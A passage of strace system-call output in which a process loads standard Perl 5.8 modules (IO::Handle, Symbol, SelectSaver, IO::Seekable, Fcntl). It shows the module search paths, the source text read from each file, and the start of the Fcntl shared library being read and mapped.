define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
5352  07:08:43.613004 stat64("/etc/perl/Symbol.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613020 stat64("/etc/perl/Symbol.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613033 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613045 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613058 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613083 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613125 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613152 stat64("/usr/lib/perl5/Symbol.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613179 stat64("/usr/share/perl5/Symbol.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613190 stat64("/usr/share/perl5/Symbol.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613203 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613215 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613228 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613240 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
5352  07:08:43.613261 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.613275 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.613286 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.613303 read(11, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
5352  07:08:43.613765 read(11, "", 4096) = 0
5352  07:08:43.613781 close(11)         = 0
5352  07:08:43.613844 stat64("/etc/perl/SelectSaver.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613861 stat64("/etc/perl/SelectSaver.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613874 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613887 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613901 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613914 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613928 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613940 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613953 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613964 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.613978 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.613990 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.614004 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.614016 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
5352  07:08:43.614037 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.614052 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.614077 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.614126 read(11, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
5352  07:08:43.614392 brk(0x81d6000)    = 0x81d6000
5352  07:08:43.614472 read(11, "", 4096) = 0
5352  07:08:43.614497 close(11)         = 0
5352  07:08:43.614998 read(10,  <unfinished ...>
5350  07:08:43.615018 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5350  07:08:43.615040 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5350  07:08:43.615054 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5350  07:08:43.615079 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5350  07:08:43.615119 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5350  07:08:43.615133 waitpid(-1,  <unfinished ...>
5352  07:08:43.615158 <... read resumed> "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
5352  07:08:43.615809 read(10, "", 4096) = 0
5352  07:08:43.615825 close(10)         = 0
5352  07:08:43.615865 stat64("/etc/perl/IO/Seekable.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.615880 stat64("/etc/perl/IO/Seekable.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.615894 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.615907 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.615921 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.615934 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.615948 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.615960 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.615977 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.615989 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.616002 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.616015 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
5352  07:08:43.616036 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 10
5352  07:08:43.616051 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2efa8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.616080 _llseek(10, 0, [0], SEEK_CUR) = 0
5352  07:08:43.616141 read(10, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
5352  07:08:43.616297 stat64("/etc/perl/Fcntl.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.616312 stat64("/etc/perl/Fcntl.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.616325 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.616338 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.616351 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.616363 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.616377 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.616388 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.616401 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.616412 stat64("/usr/share/perl5/Fcntl.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.616425 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.616437 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
5352  07:08:43.616457 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.616471 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.616482 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.616502 read(11, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
5352  07:08:43.616893 brk(0x81f7000)    = 0x81f7000
5352  07:08:43.617106 read(11, "", 4096) = 0
5352  07:08:43.617124 close(11)         = 0
5352  07:08:43.617208 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5352  07:08:43.617233 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5352  07:08:43.617297 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 11
5352  07:08:43.617311 read(11, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
5352  07:08:43.617404 fstat64(11, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5352  07:08:43.617423 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 11, 0) = 0xb7d92000
5352  07:08:43.617436 mmap2(0xb7d95000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 11, 0x2) = 0xb7d95000
5352  07:08:43.617451 close(11)         = 0
5352  07:08:43.617814 read(10, "", 4096) = 0
5352  07:08:43.617830 close(10)         = 0
